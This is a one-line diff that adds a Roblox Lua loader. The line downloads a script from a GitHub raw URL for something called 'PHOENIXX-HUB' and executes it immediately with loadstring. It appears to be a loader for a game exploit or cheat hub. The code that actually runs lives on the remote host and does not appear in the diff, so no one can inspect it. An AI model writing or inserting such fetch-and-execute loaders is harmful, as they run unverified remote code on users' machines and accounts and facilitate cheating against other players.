@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/start", true))()
